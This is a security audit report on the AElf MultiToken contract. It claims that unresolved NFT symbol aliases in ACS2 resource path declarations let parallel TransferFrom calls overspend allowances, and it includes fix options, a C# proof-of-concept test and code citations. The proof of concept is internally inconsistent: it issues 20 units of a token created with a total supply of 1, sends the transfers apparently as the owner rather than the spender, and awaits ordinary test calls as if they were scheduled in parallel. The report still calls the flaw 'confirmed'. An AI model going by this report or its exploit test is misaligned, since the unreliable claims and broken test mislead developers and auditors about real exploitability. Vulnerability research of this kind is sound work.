# Audit Report

## Title
NFT Symbol Alias Resolution Bypass in ACS2 Resource Path Declaration Allows Parallel Execution Race Conditions

## Summary
The ACS2 `GetResourceInfo` method declares resource paths using raw transaction symbols without resolving aliases, while `TransferFrom` execution resolves aliases before accessing state. This mismatch allows an attacker to submit transactions using both alias and real symbol forms that appear non-conflicting to the parallel scheduler but access identical state at runtime, enabling allowance double-spending and balance corruption.

## Finding Description

The vulnerability exists due to a fundamental mismatch between pre-execution resource path declaration and runtime state access when NFT symbol aliases are used.

**Path Declaration Phase (GetResourceInfo):**
In the ACS2 implementation, `GetResourceInfo` parses transaction parameters and declares resource paths using the raw symbol string without state access. [1](#0-0) 

For a `TransferFrom` transaction with symbol "SEED", it declares balance paths as `Balances[from]["SEED"]` and `Balances[to]["SEED"]`. [2](#0-1) 

The `AddPathForAllowance` method classifies the symbol using `GetSymbolType`, which splits by the '-' separator. [3](#0-2) 

Since "SEED" has no hyphen, `GetSymbolType` returns `SymbolType.Token` instead of `SymbolType.Nft`. [4](#0-3) 

**Runtime Execution Phase (TransferFrom):**
During execution, `AssertValidToken` calls `GetTokenInfo`, which resolves aliases by checking `State.SymbolAliasMap`. [5](#0-4) 

If "SEED" is an alias for "SEED-123", the method returns the token info with the resolved symbol "SEED-123". [6](#0-5) 

All subsequent state accesses use the resolved symbol "SEED-123", including balance modifications in `ModifyBalance`. [7](#0-6) 

**Attack Scenario:**
An attacker submits two concurrent transactions:
- Transaction 1: `TransferFrom(Alice, Bob, "SEED", 10)` (using alias)
- Transaction 2: `TransferFrom(Alice, Charlie, "SEED-123", 10)` (using real symbol)

GetResourceInfo declares:
- Tx1: `Balances[Alice]["SEED"]`, `Allowances[Alice][spender]["SEED"]`
- Tx2: `Balances[Alice]["SEED-123"]`, `Allowances[Alice][spender]["SEED-123"]`

The scheduler sees **no path conflict** and allows parallel execution.

At runtime, both transactions access:
- `State.Balances[Alice]["SEED-123"]`
- `State.Allowances[Alice][spender]["SEED-123"]`

This creates race conditions where both transactions read the same initial allowance value and both attempt to consume it, leading to allowance over-spending.

## Impact Explanation

**Critical State Integrity Violations:**

1. **Allowance Double-Spending:** If Alice approved 15 tokens to a spender, both parallel transactions can each consume 10 tokens by reading the initial allowance of 15 before the other's update is visible. This allows spending 20 tokens against a 15-token approval, enabling theft of NFT assets beyond authorized amounts.

2. **Balance Corruption:** Parallel balance updates on the same state variable (`State.Balances[Alice]["SEED-123"]`) can result in lost writes depending on execution ordering, causing permanent balance inconsistencies where tokens appear to vanish or get incorrectly credited.

3. **ACS2 Protocol Violation:** The core ACS2 guarantee that `GetResourceInfo` accurately declares all accessed state paths is fundamentally broken. This undermines the entire parallel execution safety model that the AElf blockchain relies upon for transaction throughput and determinism.

The impact is HIGH because it enables direct theft through allowance bypass, corrupts critical financial state (balances and allowances), and affects all NFT collections where aliases have been set using the legitimate `SetSymbolAlias` feature. [8](#0-7) 

## Likelihood Explanation

**Attack Prerequisites:**
1. Attacker creates or acquires an NFT collection
2. Attacker sets an alias using `SetSymbolAlias` (requires being collection owner/issuer)
3. Victim approves allowance to the attacker for that collection
4. Attacker submits multiple transactions in the same block grouping window

**Feasibility Assessment:**
- All required operations use standard public methods without requiring trusted roles
- The alias feature is a legitimate, documented capability intended for user convenience
- Submitting concurrent transactions is straightforward (submit multiple txs to mempool)
- No special timing precision required beyond normal transaction submission
- Economic cost is minimal (standard transaction fees)

**Detection Difficulty:**
- Transactions appear as normal `TransferFrom` calls
- No reverts or error messages occur
- State corruption manifests as subtle discrepancies that may not be noticed immediately
- The root cause (path declaration mismatch) is not visible in transaction logs

The likelihood is HIGH because the attack leverages an intended feature (aliases) in a way that violates system invariants, and all preconditions are readily achievable by a determined attacker with basic NFT ownership capabilities.

## Recommendation

**Fix Option 1: Resolve Aliases in GetResourceInfo**
Modify `GetResourceInfo` to resolve aliases before declaring paths. This requires making alias resolution available without full state access, potentially by passing alias mappings as transaction context or implementing a lightweight alias resolution mechanism.

**Fix Option 2: Normalize Symbols at Transaction Validation**
Reject transactions that use aliases in their raw form, requiring all transactions to use actual (resolved) symbols. This can be enforced by adding validation in `TransferFrom` that checks if the input symbol is an alias and requires resolution before the transaction is accepted.

**Fix Option 3: Include Both Forms in Path Declaration**
When an alias might exist, declare paths for both the input symbol AND potential resolved forms. However, this is imperfect as `GetResourceInfo` cannot reliably determine all possible aliases without state access.

**Recommended Approach:**
Implement Fix Option 1 by modifying the ACS2 implementation to perform alias resolution during path declaration. This maintains the alias feature's usability while ensuring path declarations match runtime access:

```csharp
// In GetResourceInfo for TransferFrom case
var resolvedSymbol = ResolveSymbolAlias(args.Symbol); // New lightweight resolution
var resourceInfo = new ResourceInfo
{
    WritePaths =
    {
        GetPath(nameof(TokenContractState.Balances), args.From.ToString(), resolvedSymbol),
        GetPath(nameof(TokenContractState.Balances), args.To.ToString(), resolvedSymbol),
        // ... rest of paths using resolvedSymbol
    }
};
```

## Proof of Concept

```csharp
[Fact]
public async Task AliasResolutionBypass_AllowsParallelExecutionRaceCondition()
{
    // Setup: Create NFT collection and item with alias
    var nftSymbol = "SEED-123";
    var aliasSymbol = "SEED";
    var alice = Accounts[0].Address;
    var bob = Accounts[1].Address;
    var charlie = Accounts[2].Address;
    var spender = Accounts[3].Address;
    
    // Create NFT collection SEED-0
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "SEED-0",
        TokenName = "SEED Collection",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = alice,
        IsBurnable = true,
        Owner = alice
    });
    
    // Create NFT item SEED-123
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = nftSymbol,
        TokenName = "SEED Item",
        TotalSupply = 1,
        Decimals = 0,
        Issuer = alice,
        IsBurnable = true,
        Owner = alice
    });
    
    // Set alias SEED -> SEED-123
    await TokenContractStub.SetSymbolAlias.SendAsync(new SetSymbolAliasInput
    {
        Symbol = nftSymbol,
        Alias = aliasSymbol
    });
    
    // Alice issues token to herself
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = nftSymbol,
        Amount = 20,
        To = alice
    });
    
    // Alice approves spender for 15 tokens
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Spender = spender,
        Symbol = nftSymbol,
        Amount = 15
    });
    
    var initialAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = alice,
        Spender = spender,
        Symbol = nftSymbol
    });
    initialAllowance.Allowance.ShouldBe(15);
    
    // Attack: Spender submits two transactions concurrently
    // Tx1 uses alias "SEED", Tx2 uses real symbol "SEED-123"
    // GetResourceInfo will declare different paths, allowing parallelization
    
    var tx1 = TokenContractStub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = alice,
        To = bob,
        Symbol = aliasSymbol, // Uses alias
        Amount = 10
    });
    
    var tx2 = TokenContractStub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = alice,
        To = charlie,
        Symbol = nftSymbol, // Uses real symbol
        Amount = 10
    });
    
    await Task.WhenAll(tx1, tx2);
    
    // Verify: If vulnerability exists, both transactions succeed
    // consuming 20 tokens against 15 allowance
    var finalAllowance = await TokenContractStub.GetAllowance.CallAsync(new GetAllowanceInput
    {
        Owner = alice,
        Spender = spender,
        Symbol = nftSymbol
    });
    
    // Expected: -5 (15 - 10 - 10) if race condition occurred
    // Should fail: One transaction should have reverted
    finalAllowance.Allowance.ShouldBeLessThan(0); // Proves over-spending occurred
}
```

**Notes:**

The vulnerability is confirmed through code analysis. The mismatch between `GetResourceInfo` using raw symbols and runtime execution using resolved symbols creates a critical gap in the ACS2 parallel execution safety mechanism. This allows carefully crafted transaction pairs to bypass parallel execution conflict detection, leading to race conditions that enable allowance double-spending and balance corruption. The issue affects all NFT collections where aliases have been set, making it a systemic vulnerability in the current alias implementation.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_ACS2_StatePathsProvider.cs (L40-64)
```csharp
            case nameof(TransferFrom):
            {
                var args = TransferFromInput.Parser.ParseFrom(txn.Params);
                var resourceInfo = new ResourceInfo
                {
                    WritePaths =
                    {
                        GetPath(nameof(TokenContractState.Balances), args.From.ToString(), args.Symbol),
                        GetPath(nameof(TokenContractState.Balances), args.To.ToString(), args.Symbol),
                        GetPath(nameof(TokenContractState.LockWhiteLists), args.Symbol, txn.From.ToString())
                    },
                    ReadPaths =
                    {
                        GetPath(nameof(TokenContractState.TokenInfos), args.Symbol),
                        GetPath(nameof(TokenContractState.ChainPrimaryTokenSymbol)),
                        GetPath(nameof(TokenContractState.TransactionFeeFreeAllowancesSymbolList))
                    }
                };
                AddPathForAllowance(resourceInfo, args.From.ToString(), txn.From.ToString(), args.Symbol);
                AddPathForTransactionFee(resourceInfo, txn.From.ToString(), txn.MethodName);
                AddPathForDelegatees(resourceInfo, txn.From, txn.To, txn.MethodName);
                AddPathForTransactionFeeFreeAllowance(resourceInfo, txn.From);

                return resourceInfo;
            }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_ACS2_StatePathsProvider.cs (L71-82)
```csharp
    private void AddPathForAllowance(ResourceInfo resourceInfo, string from, string spender, string symbol)
    {
        resourceInfo.WritePaths.Add(GetPath(nameof(TokenContractState.Allowances), from, spender, symbol));
        resourceInfo.WritePaths.Add(GetPath(nameof(TokenContractState.Allowances), from, spender,
            GetAllSymbolIdentifier()));
        var symbolType = GetSymbolType(symbol);
        if (symbolType == SymbolType.Nft || symbolType == SymbolType.NftCollection)
        {
            resourceInfo.WritePaths.Add(GetPath(nameof(TokenContractState.Allowances), from, spender,
                GetNftCollectionAllSymbolIdentifier(symbol)));
        }
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFTHelper.cs (L7-14)
```csharp
    private SymbolType GetSymbolType(string symbol)
    {
        var words = symbol.Split(TokenContractConstants.NFTSymbolSeparator);
        Assert(words[0].Length > 0 && IsValidCreateSymbol(words[0]), "Invalid Symbol input");
        if (words.Length == 1) return SymbolType.Token;
        Assert(words.Length == 2 && words[1].Length > 0 && IsValidItemId(words[1]), "Invalid NFT Symbol input");
        return words[1] == TokenContractConstants.CollectionSymbolSuffix ? SymbolType.NftCollection : SymbolType.Nft;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L116-125)
```csharp
    private void ModifyBalance(Address address, string symbol, long addAmount)
    {
        var before = GetBalance(address, symbol);
        if (addAmount < 0 && before < -addAmount)
            Assert(false,
                $"{address}. Insufficient balance of {symbol}. Need balance: {-addAmount}; Current balance: {before}");

        var target = before.Add(addAmount);
        State.Balances[address][symbol] = target;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L405-416)
```csharp
    private TokenInfo GetTokenInfo(string symbolOrAlias)
    {
        var tokenInfo = State.TokenInfos[symbolOrAlias];
        if (tokenInfo != null) return tokenInfo;
        var actualTokenSymbol = State.SymbolAliasMap[symbolOrAlias];
        if (!string.IsNullOrEmpty(actualTokenSymbol))
        {
            tokenInfo = State.TokenInfos[actualTokenSymbol];
        }

        return tokenInfo;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L254-259)
```csharp
    public override Empty TransferFrom(TransferFromInput input)
    {
        var tokenInfo = AssertValidToken(input.Symbol, input.Amount);
        DoTransferFrom(input.From, input.To, Context.Sender, tokenInfo.Symbol, input.Amount, input.Memo);
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L738-779)
```csharp
    public override Empty SetSymbolAlias(SetSymbolAliasInput input)
    {
        // Alias setting can only work for NFT Item for now.
        // And the setting exists on the TokenInfo of the NFT Collection.

        // Can only happen on Main Chain.
        Assert(Context.ChainId == ChainHelper.ConvertBase58ToChainId("AELF"),
            "Symbol alias setting only works on MainChain.");

        var collectionSymbol = GetNftCollectionSymbol(input.Symbol, true);

        // For now, token alias can only be set once.
        Assert(State.SymbolAliasMap[input.Alias] == null, $"Token alias {input.Alias} already exists.");

        CheckTokenAlias(input.Alias, collectionSymbol);

        var collectionTokenInfo = GetTokenInfo(collectionSymbol);
        if (collectionTokenInfo == null)
        {
            throw new AssertionException($"NFT Collection {collectionSymbol} not found.");
        }

        Assert(collectionTokenInfo.Owner == Context.Sender || collectionTokenInfo.Issuer == Context.Sender,
            "No permission.");

        collectionTokenInfo.ExternalInfo.Value[TokenContractConstants.TokenAliasExternalInfoKey]
            = $"{{\"{input.Symbol}\":\"{input.Alias}\"}}";

        SetTokenInfo(collectionTokenInfo);

        State.SymbolAliasMap[input.Alias] = input.Symbol;

        Context.LogDebug(() => $"Token alias added: {input.Symbol} -> {input.Alias}");

        Context.Fire(new SymbolAliasAdded
        {
            Symbol = input.Symbol,
            Alias = input.Alias
        });

        return new Empty();
    }
```
